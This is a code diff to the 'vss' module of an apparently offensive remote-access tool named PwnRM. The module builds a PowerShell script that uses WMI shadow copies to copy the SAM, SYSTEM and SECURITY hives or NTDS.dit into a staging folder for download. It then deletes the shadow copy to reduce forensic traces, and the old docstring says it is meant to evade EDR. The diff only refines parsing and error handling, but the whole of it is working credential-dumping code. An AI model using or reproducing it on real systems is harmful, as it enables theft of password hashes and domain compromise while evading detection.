@@ -1,6 +1,8 @@
-"""
-modules.vss — In-Memory Volume Shadow Copy Service (VSS) Extraction
-Performs stealthy Volume Shadow Copy creation and registry/NTDS extraction via WMI/CIM reflection without calling vssadmin.exe or ntdsutil.exe (bypassing EDR heuristics).
+"""Volume Shadow Copy Service extraction through WMI.
+
+The module avoids ``vssadmin.exe`` and ``ntdsutil.exe``, but the selected
+database and hives are intentionally copied to a temporary staging directory
+on the remote host so that the operator can download them.
 """
 
 import re
@@ -12,7 +14,7 @@ from ..shell.commands import b64str
 
 class VSSModule(BaseModule):
     name = "vss"
-    description = "In-Memory VSS Shadow Copy & Credential Hive Extractor (SAM, SYSTEM, NTDS.dit via WMI)"
+    description = "WMI VSS shadow-copy extractor (remote temporary staging for SAM/SYSTEM/NTDS.dit)"
     author = "uziii2208"
     options = {
         "--drive": {"desc": "Target drive letter (default: C:)"},
@@ -23,19 +25,35 @@ class VSSModule(BaseModule):
 
     def run(self, shell, args: List[str]) -> Any:
         drive = "C:"
-        for i, a in enumerate(args):
-            if a == "--drive" and i + 1 < len(args):
-                drive = args[i + 1].rstrip("\\").upper()
+        requested_modes = []
+        index = 0
+        while index < len(args):
+            arg = args[index].lower()
+            if arg == "--drive":
+                if index + 1 >= len(args) or args[index + 1].startswith("-"):
+                    shell.write_error("  [-] --drive requires a drive letter such as C:.")
+                    return {"status": "error", "reason": "missing_drive"}
+                drive = args[index + 1].rstrip("\\").upper()
                 if not drive.endswith(":"):
                     drive += ":"
+                index += 2
+                continue
+            if arg in {"sam", "--sam", "ntds", "--ntds"}:
+                requested_modes.append(arg.lstrip("-"))
+                index += 1
+                continue
+            if arg == "--clean":
+                index += 1
+                continue
+            shell.write_error(f"  [-] Unknown VSS option: {args[index]}")
+            return {"status": "error", "reason": "invalid_options"}
 
         if not re.fullmatch(r"[A-Z]:", drive):
             shell.write_error("  [-] Invalid VSS drive. Expected a drive letter such as C:.")
             return {"status": "error", "reason": "invalid_drive"}
 
-        normalized_args = {arg.lower() for arg in args}
-        request_ntds = bool(normalized_args & {"ntds", "--ntds"})
-        request_sam = bool(normalized_args & {"sam", "--sam"})
+        request_ntds = "ntds" in requested_modes
+        request_sam = "sam" in requested_modes
         if request_ntds and request_sam:
             shell.write_error("  [-] Choose either SAM or NTDS extraction, not both.")
             return {"status": "error", "reason": "conflicting_modes"}
@@ -44,12 +62,12 @@ class VSSModule(BaseModule):
         drive_ps = shell._pse(drive)
         requested_mode_ps = shell._pse(requested_mode)
 
-        shell.write_info(c(M + BLD, f"  [*] PwnRM VSS Engine — initializing WMI-based shadow copy operations on {drive}..."))
+        shell.write_info(c(M + BLD, f"  [*] PwnRM VSS Engine — initializing WMI-based shadow-copy staging on {drive}..."))
 
         ps = f"""
-$ErrorActionPreference = 'SilentlyContinue'
+$ErrorActionPreference = 'Stop'
 Write-Host "`n========================================================" -ForegroundColor Cyan
-Write-Host "   PwnRM In-Memory VSS Extraction & Credential Hives" -ForegroundColor Cyan
+Write-Host "   PwnRM WMI VSS Extraction & Credential Hives" -ForegroundColor Cyan
 Write-Host "========================================================`n" -ForegroundColor Cyan
 
 $drive = '{drive_ps}\\'
@@ -70,33 +88,27 @@ $shadowClass = [wmiclass]"Win32_ShadowCopy"
 $createResult = $shadowClass.Create($drive, "ClientAccessible")
 
 if ($createResult.ReturnValue -ne 0) {{
-    Write-Host "  [-] Failed to create Volume Shadow Copy. ReturnValue: $($createResult.ReturnValue)" -ForegroundColor Red
-    Write-Host "      (Requires Administrator privileges and VSS service enabled)" -ForegroundColor DarkGray
-    return
+    throw "Failed to create Volume Shadow Copy (ReturnValue=$($createResult.ReturnValue)); Administrator rights and VSS are required"
 }}
 
 $shadowId = $createResult.ShadowID
 Write-Host "  [+] Shadow Copy Created successfully! ID: $shadowId" -ForegroundColor Green
 
-# 2. Retrieve Shadow Copy Device Object Path
-$shadow = Get-WmiObject Win32_ShadowCopy | Where-Object {{ $_.ID -eq $shadowId }}
-$deviceObj = $shadow.DeviceObject
-
-if (-not $deviceObj) {{
-    Write-Host "  [-] Could not resolve Shadow Copy DeviceObject." -ForegroundColor Red
-    $shadow.Delete()
-    return
-}}
-
-Write-Host "  [+] Device Object : $deviceObj" -ForegroundColor Green
-
-# 3. Extract Target Hives
-Write-Host "`n[2. Extracting Registry & Database Hives]" -ForegroundColor Yellow
-$tempPath = [System.IO.Path]::GetTempPath()
-$stagingDir = Join-Path $tempPath ("pwnrm_vss_" + (Get-Random))
-New-Item -Path $stagingDir -ItemType Directory -Force | Out-Null
-
+$shadow = $null
+$stagingDir = $null
 try {{
+    # 2. Retrieve Shadow Copy Device Object Path
+    $shadow = Get-WmiObject Win32_ShadowCopy | Where-Object {{ $_.ID -eq $shadowId }}
+    $deviceObj = $shadow.DeviceObject
+    if (-not $deviceObj) {{ throw "Could not resolve the Shadow Copy DeviceObject" }}
+    Write-Host "  [+] Device Object : $deviceObj" -ForegroundColor Green
+
+    # 3. Extract Target Hives
+    Write-Host "`n[2. Extracting Registry & Database Hives]" -ForegroundColor Yellow
+    $tempPath = [System.IO.Path]::GetTempPath()
+    $stagingDir = Join-Path $tempPath ("pwnrm_vss_" + [Guid]::NewGuid().ToString("N"))
+    New-Item -Path $stagingDir -ItemType Directory | Out-Null
+
     # Copy SYSTEM hive
     $sysSrc = "$deviceObj\\Windows\\System32\\config\\SYSTEM"
     $sysDst = Join-Path $stagingDir "SYSTEM"
@@ -116,7 +128,7 @@ try {{
             Write-Host "  [!] NTDS.DIT Extracted   : $ntdsDst ($ntdsSize bytes)" -ForegroundColor Red
             Write-Host "      SHA-256: $ntdsHash" -ForegroundColor DarkRed
         }} else {{
-            Write-Host "  [-] ntds.dit not found on $drive (not an active DC directory database)." -ForegroundColor Yellow
+            throw "ntds.dit was not found on $drive"
         }}
     }} else {{
         $samSrc = "$deviceObj\\Windows\\System32\\config\\SAM"
@@ -127,7 +139,7 @@ try {{
             $samHash = (Get-FileHash -LiteralPath $samDst -Algorithm SHA256).Hash
             Write-Host "  [+] SAM Hive Extracted    : $samDst ($samSize bytes)" -ForegroundColor Green
             Write-Host "      SHA-256: $samHash" -ForegroundColor Gray
-        }}
+        }} else {{ throw "SAM hive was not found on $drive" }}
 
         $secSrc = "$deviceObj\\Windows\\System32\\config\\SECURITY"
         $secDst = Join-Path $stagingDir "SECURITY"
@@ -138,10 +150,17 @@ try {{
     }}
 }} catch {{
     Write-Host "  [-] Error during file extraction: $_" -ForegroundColor Red
+    throw
 }} finally {{
     # 4. Immediate Forensics Cleanup: Delete Shadow Copy
     Write-Host "`n[3. Deleting Ephemeral Shadow Copy (Forensic Hygiene)]" -ForegroundColor Yellow
-    $shadow.Delete()
+    $cleanupShadow = $shadow
+    if (-not $cleanupShadow) {{
+        $cleanupShadow = Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue | Where-Object {{ $_.ID -eq $shadowId }}
+    }}
+    if ($cleanupShadow) {{ $null = $cleanupShadow.Delete() }}
+    $remainingShadow = Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue | Where-Object {{ $_.ID -eq $shadowId }}
+    if ($remainingShadow) {{ throw "Shadow Copy $shadowId still exists after cleanup" }}
     Write-Host "  [+] Shadow Copy $shadowId deleted." -ForegroundColor Green
 }}
 
